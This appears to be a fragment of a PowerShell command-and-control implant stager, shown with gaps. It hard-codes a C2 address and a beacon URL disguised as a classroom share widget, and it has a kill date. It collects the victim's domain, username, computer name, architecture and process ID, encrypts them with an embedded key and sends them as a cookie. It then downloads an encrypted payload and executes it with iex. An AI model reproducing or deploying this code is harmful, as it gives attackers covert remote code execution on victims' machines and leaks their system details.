...
$h=""
$sc=""
$urls=@("https://192.168.0.52")
$curl="/classroom/sharewidget/widget_stable.html/"
$s=$urls[0]
function CAM ($key,$IV){
...
$k = [datetime]::ParseExact("2020-12-24","yyyy-MM-dd",$null);
if ($k -lt $d) {exit}
$username = ""
$password = ""
$proxyurl = ""
...
elseif($h){$script:s="https://$($h)/classroom/sharewidget/widget_stable.html/";$script:sc="https://$($h)"}
...
$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;1"
try {$pp=enc -key M6x4+qVa4Sc312Seu83xHkCSAdq4etzFf6NjfLbCsns= -un $o} catch {$pp="ERROR"}
$primern = (Get-Webclient -Cookie $pp).downloadstring($script:s)
$p = dec -key M6x4+qVa4Sc312Seu83xHkCSAdq4etzFf6NjfLbCsns= -enc $primern
if ($p -like "*key*") {$p| iex}
}
function primers {
